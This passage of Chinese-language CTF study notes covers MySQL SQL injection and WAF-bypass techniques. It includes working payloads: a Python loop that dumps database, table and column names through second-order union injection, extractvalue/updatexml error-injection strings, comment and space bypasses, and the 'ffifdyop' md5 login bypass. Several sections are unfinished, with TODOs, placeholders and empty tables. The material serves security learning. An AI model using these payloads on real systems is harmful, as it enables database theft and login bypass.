第三个SQL语句负责查询个人简介。注意到`$_SEESION['username']`未经转义，因此此处参数可控，可以注入，拼接的SQL语句等价于`select info from users where username = '1' union select database() #`。我们并没有注册过用户名为`1`的账户，因此前一个`SELECT`语句返回空值，而后一个`SELECT`语句的值被合并到`info`一列中，造成回显。

综上所述，我们可以不断地注册用户名，并查看其个人简介一栏，从而进行爆库：

```python
import requests

URL_PREFIX = "......"

def send(action: str, postData: dict):
    # 按照action发送到不同的URL

def register(username:str,password:str)->None:
    postData = {"username":username,"password":password}
    send('reg',postData)

def login(username:str,password:str)->str:
    postData = {"username":username,"password":password}
    return send('login',postData)

def getResult(username:str,password:str)->str:
    register(username,password)
    return login(username,password)
    
usernamePayloads = [
    "1' union select database() #",
    "1' union select group_concat(table_name) from information_schema.tables where table_schema=database() #",
    "1' union select group_concat(column_name) from information_schema.columns where table_name='flag' #",
    "1' union select group_concat(flag) from ctftraining.flag #"
] # 爆数据库名、爆表名、爆列名、爆数据
for username in usernamePayloads:
    print(getResult(username,"123456"))
```

## §3.8 `handler`注入

`HANDLER`是SQL中的一个关键词，但是它并不属于标准的SQL语法。根据[官方文档](https://dev.mysql.com/doc/refman/5.6/en/handler.html)，`HANDLER`子句提供在存储引擎层面（InnoDB、MyISAM）直访表中内容的接口。

> [MySQL 5.6 Reference Manual](https://dev.mysql.com/doc/refman/5.6/en/) / [...](https://dev.mysql.com/doc/refman/5.6/en/handler.html) / HANDLER Statement
>
> 13.2.4 HANDLER Statement
>
> ```
> HANDLER tbl_name OPEN [ [AS] alias]
> 
> HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
>     [ WHERE where_condition ] [LIMIT ... ]
> HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
>     [ WHERE where_condition ] [LIMIT ... ]
> HANDLER tbl_name READ { FIRST | NEXT }
>     [ WHERE where_condition ] [LIMIT ... ]
> 
> HANDLER tbl_name CLOSE
> ```

```mysql
mysql> HANDLER 表名 OPEN as a;
Query OK, 0 rows affected (0.00 sec)

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
+----+----------+----------+

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  2 | Angelina | 123      |
+----+----------+----------+

mysql> HANDLER a READ NEXT;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | Dummy    | 123      |
+----+----------+----------+

mysql> HANDLER a CLOSE;
Query OK, 0 rows affected (0.00 sec)
```



# §4 绕过WAF

## §4.1 Fuzz



## §4.2 比较数字大小

众所周知，SQL提供`=`、`<`、`>`、`<=`、`>=`、`<>`用于比较数字的大小。假如WAF过滤了`<`、`>`、`=`这三种字符，我们怎么比较呢？

### §4.2.1 `ifnull()`与`nullif()`

| 函数名        | 返回值                                  |
| ------------- | --------------------------------------- |
| `ifnull(a,b)` | return a != NULL ? a : b（Null就返回b） |
| `nullif(a,b)` | return a=b ? NULL : a（猜对就返回Null） |

我们使用`nullif(待测值,猜测值)`，通过穷举`猜测值`可以得到`猜测结果`。再使用`ifnull(猜测结果,失败值)`，可以得到`成功值`。将这两个函数套起来使用，我们最终得到的返回值等价于`待测值==猜测值 ? 成功值 : 待测值`。此处的`成功值`由攻击者完全可控：

```sql
mysql> select ifnull(nullif(length((SELECT子句)),猜测值),失败值); # 猜测字符串长度

mysql> select ifnull(nullif(length((select(database()))),7),-1);
	# 8,猜测失败,返回字符串长度
mysql> select ifnull(nullif(length((select(database()))),8),-1);
	# -1,猜测成功,返回成功值
mysql> select ifnull(nullif(length((select(database()))),9),-1);
	# 8,猜测失败，返回字符串长度
```

由于成功值完全可控，我们可以使其等于一些异常值，使SQL语句报错，详见报错注入。

### §4.2.2 `case()when()then()else()`

SQL中有一类`case`语句，其作用类似于其他编程语言中的`switch()`。按理来说，`case()`提供的功能也可以视为一种比较：

```sql
mysql> select case(待测值)when(猜测值1)then(成功值1)when(猜测值2)then(成功值2)else(失败值)end;

mysql> select username,case username
    when '嘉然Diana' then 'Asoul'
    when '七海Nana7mi' then 'Virtual Real'
    when '白神遥Haruka' then 'PSP Live'
    else '其它'
    end as '所属社团'
from users;
```

### §4.2.3 `regexp()`

`regexp()`能从一个字段的多个数据中提过滤得到符合给定正则表达式的数据，特别适用于节省`group_concat()`返回的字符数。

```sql
mysql> 
```



## §4.3 从字符串中提取字符

我们知道，`substr()`与`substring()`（`substr(字符串，从1开始的起始位置,截取长度)`）经常被用于从字符串中提取字符。假如WAF拦截了这个函数，我们该怎么办呢？

### §4.3.1 `instr()`

`instr(字符串,子字符串)`用于返回子字符串在字符串中第一次出现时，第一个字符的位置（从一开始数）。

> 注意：此函数不区分字符的大小写。

```sql
mysql> select(instr((select(database())),'e'));
+-----------------------------------+
| (instr((select(database())),'e')) |
+-----------------------------------+
|                                 2 |
+-----------------------------------+
```

```c
function getData(){
	SELECT子句 = input(输入SELECT子句);
	子字符串 = '';
    while(1){
    	for(int ascii = 0 ; ascii < 128 ; ascii++){
            if((子字符串+ascii)得到的结果 = 1){
                子字符串 += ascii
                break;
            }
        }
    }
}
```

### §4.3.2 `left()`与`right()`

| 函数名                   | 返回值                                     |
| ------------------------ | ------------------------------------------ |
| `left(字符串,截取长度)`  | 从字符串最左端开始，截取固定长度的子字符串 |
| `right(字符串,截取长度)` | 从字符串最右端开始，截取固定长度的子字符串 |

## §4.4 创建大数

大数溢出注入要求数字必须大于等于`0x8000000000000000`。假如WAF限制不许有三个及以上的连续数字，该怎么构造出大数呢？

### §4.4.1 `~0+1`

```mysql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

### §4.4.2 `exp(710)`

```mysql
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

如果题目对数字的范围限制更严格，允许的数字更小，则可以考虑把`710`扩写成`9+9+9+...+9`。

## §4.5 绕过空格

### §4.5.1 内联注释`/**/`

有一些WAF是基于正则表达式实现过滤的。各大SQL数据库均支持使用`/**/`将其中的内容视为注释。使用内联注释可以绕过WAF。

```python
def WAF(rawString:str)->bool:
    if re.search(r'\s',rawString) is None:
        print('"{}" succeed.'.format(rawString))
    else:
        print('"{}" failed'.format(rawString))

def bypassWAF(rawString:str)->str:
    return rawString.replace(' ','/**/')

payload = "select * from users;"
WAF(payload)
WAF(bypassWAF(payload))
```

```mysql
mysql> select/**/*/**/from/**/users;
	// ......
	13 rows in set (0.01 sec)
```

MySQL为了保证与其它数据库兼容，于是将MySQL特有的语法放在`/*!...*/`中。其它SQL数据库会将其视为注释，但是MySQL可以执行。也可以通过一个五位数来指定该语句执行所需的MySQL最低版本，例如`/*!50001... */`表示MySQL版本`>=5.00.01`时才能执行。

### §4.5.2 `%0a`/`%0b`/`%0c`

| ASCII码 | 含义 |
| ------- | ---- |
|         |      |
|         |      |
|         |      |

`%0a`是换行的意思。这个字符的神奇之处在于它能绕过注释的限制。例如`-- abc /* %0a */`，其中`--`后的字符被解析为注释，直到遇到了`%0a`另起一行。我们知道`--`是单行注释，因此不会干扰下一行，于是这个句子完全等价于`*/`。

将`%0a`与[§4.5.1 内联注释`/**/`](###§4.5.1 内联注释`/**/`)一节介绍的内容结合，我们就能对MySQL实现完美的WAF绕过：

```sql
> id=1'/**/union/*!50001select*//*!1,2,3*/--abc/*%0afrom/**/admin#*/
→ id=1' union select 1,2,3 -- abc/*
	from admin #*/
```







对于这个注入点：`SELECT * FROM users WHERE id='' LIMIT 0,1`，并且过滤了空格与`and`、`or`，可以使用`^`运算符。其优点在于这个二元运算符两侧的表达式之间不必有空格，可以错误注入。

`select username from ... where ...`包含空格，那么我们就用`select(username)from(...)where(...)`

不能用`where(id=1)`的`=`，我们就用`where((列名)like('数据'))`

不幸的是，`LIMIT`子句没有`LIMIT(1)`、`LIMIT(0),(1)`、`LIMIT(0,1)`之类的绕过方法，必须带空格。所以无法通过`LIMIT`指定输出哪一行的数据

`left()`与`right()`会在数据库有多行时返回多行，需要用`group_concat()`变成一行，才能？？？？

爆数据库名：

```sql
?id=1'^extractvalue(1,concat(0x7e,(select(database()))))%23
```

爆表名：

```sql
?id=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('数据库名')))))%23
```

爆列名：

```sql
?id=1'^extractvalue(0x0a,concat(0x0a,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('表名')))))%23
```

或者TODO：？？？？？？？`select/**/*/**/from/**/users`



## §4.4 截取字符串绕`substr()`与`substring()`

使用字符串拼接运算符`||`

？？？？？？？？？？？？？？？？

```
mysql> SELECT * from users where id regexp('1');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
| 10 | admin2   | 123      |
| 11 | admin3   | 123      |
| 12 | dhakkan  | 123      |
| 14 | admin4   | 123      |
+----+----------+----------+
5 rows in set (0.00 sec)

mysql> SELECT * from users where id regexp('1') && username regexp('^a');
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 10 | admin2   | 123      |
| 11 | admin3   | 123      |
| 14 | admin4   | 123      |
+----+----------+----------+

&&(column_name)regexp('^r')绕空格
注意是绕报错注入的30字符限制
(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#
```



## §4.5 内联注释绕空格

`select * from users`与`select/**/*/**/from/**/users`的效果一样，只是把空格换成了`/**/`而已。



## §4.6 合成字符

## §4.7 绕过注释符

考虑以下语句：`select * from users where id='$id' limit 0,1`，禁用所有注释符。

可以考虑Payload为`1' group by 2,'`，得到的SQL语句为`select * from users where id='1' group by 2,'' limit 0,1`。这里不用`order by`爆列数的原因是`group by`支持多参数，可以闭合最后的单引号。

## §4.8 绕过`information_schema`爆列名

使用`mysql`数据库的`innodb_index_stats`和 `innodb_table_stats`两张表。

https://dba.stackexchange.com/questions/54608/innodb-error-table-mysql-innodb-table-stats-not-found-after-upgrade-to-mys

？？？？？？找不到这张表TODO：？？？？？？？？

https://www.cnblogs.com/upfine/p/16496021.html

## §4.9 绕过列名

假设`users`表内含有`id`、`username`、`password`这三列，SQL语句为`select * from users where username=$username`，但是`$username`过滤了这三个列名，所以我们不能再`' and 1=0 union select group_concat('password'),2,3`。

### §4.9.1 子查询创建新列名

当我们使用SELECT子句且未指定FROM子句的时候，SQL将会把列名也作为这一列的内容：

```sql
mysql> select 'abc',123,000;
    +-----+-----+-----+
    | abc | 123 | 000 |
    +-----+-----+-----+
    | abc | 123 |   0 |
    +-----+-----+-----+
    1 row in set (0.00 sec)
```

在保证列数相同的前提下，使用UNION子句不会改变返回结果的列名。为了过滤掉第一行无用的数据，我们使用LIMIT或OFFSET子句：

```sql
mysql> select 'abc',123,000 union select * from users;
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | abc | 123      | 0     |
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    3 rows in set (0.00 sec)
    
mysql> select 'abc',123,000 union select * from users limit 1,999999; # 过滤第0行,取后续足够多的行
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    2 rows in set (0.00 sec)
    
mysql> select 'abc',123,000 union select * from users limit 999999 offset 1; # 从1行开始，后取足够多的行
    +-----+----------+-------+
    | abc | 123      | 000   |
    +-----+----------+-------+
    | 1   | Dumb     | admin |
    | 2   | Angelina | root  |
    +-----+----------+-------+
    2 rows in set (0.00 sec)
```

这里我们已经拿到了想要的数据，并且绕过了列名。接下来需要将这次的返回结果作为子查询，由外层的SELECT子句筛选我们想要的值：

```mysql
mysql> select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
	# 必须给子查询指定别名，这里用的别名是a，否则报错：ERROR 1248 (42000): Every derived table must have its own alias
	# group_concat调用数字类型的列名时必须加反引号进行转置，否则列名会被解析成数字字符串，而不是对应的列
    +-------------------+---------------------+------------------------+
    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
    +-------------------+---------------------+------------------------+
    | 1,2               | Dumb,Angelina       | admin,root             |
    +-------------------+---------------------+------------------------+
    1 row in set (0.00 sec)
```

最终构造Payload：`' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;# `

```sql
mysql> select * from users where username='' and 1=0 union select group_concat(abc),group_concat(`123`),group_concat(`000`) from (select 'abc',123,000 union select * from users limit 1,999999)a;
    +-------------------+---------------------+------------------------+
    | group_concat(abc) | group_concat(`123`) | group_concat(`000`)    |
    +-------------------+---------------------+------------------------+
    | 1,2               | Dumb,Angelina       | admin,root             |
    +-------------------+---------------------+------------------------+
    1 row in set (0.00 sec)
```

## §4.10 反引号

反引号用于区分SQL的保留字与普通字符，在各大SQL数据库中均适用。如果`sleep(1)`被屏蔽，可以试试```sleep`(1)``。

# §5 PHP与SQL的综合Bypass

## §5.1 PHP的`md5()`

[PHP官方文档](https://www.php.net/manual/en/function.md5.php)对`md5()`的定义如下：

> `md5(string $string, bool $binary = false): string`
>
> - string
>
>   待加密的字符串
>
> - binary
>
>   可选。为`true`时返回16字节的二进制形式。

审计以下代码：

```php
$username = addslashes(......)
$password = md5(......,true);
$sql = "select * from users where username='$username' and password='$password'";
```

当`md5(...)`的前五个字节恰好符合正则表达式`\‘or\'[1-9]`，且后面的11个字节没有`'`时，拼接形成的SQL语句为`select * from users where username='...' and password=''or'???????????'`。

SQL在将字符串作为布尔值进行处理时，会尝试将前几个数字字符转化为整数（如果第一个字符不是数字，则会被当作`false`，并生成一个`Truncated incorrect INTEGER value: '...'`的警告）。转化为整数后，如果其为0，则被当作`false`，并生成一个`Truncated incorrect INTEGER value: '...'`的警告，反之为`true`：

```mysql
mysql> select * from users where password=''or'1abc';
......
13 rows in set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'0abc';
Empty set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'000abc';
Empty set, 1 warning (0.00 sec)

mysql> select * from users where password=''or'001abc';
......
13 rows in set, 1 warning (0.00 sec)
```

经过穷举，`ffifdyop`的MD5值恰好满足以上所有条件，可以绕过登录系统的密码校验。

```php
$md5 = md5("ffifdyop",true); # 'or'6É].é!r,ùíb.
$sql = "select * from `admin` where password='$md5'";
echo $sql;
```























过滤单引号时闭合单引号：`select * from users where username='123' and passwd='123'`，让`username=\`使后面的`'`被转义，再由`passwd=...;`即可闭合单引号：

```python
URL_PREFIX = "http://703919f8-2d7e-4009-83cf-425433e65a3d.node4.buuoj.cn:81"
print(SQL_TEMPLATE.format('\\','||/**/passwd/**/regexp/**/"^a";%00'))
	# select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^a";%00'
```





SQL`%00`会认为这为当前命令结尾，可以截断字符串。`....;%00....`，可代替注释符



Python处理特殊字符时会自动URL编码，例如：

```python
data = "%00" # ×
data = chr(0) # √
```

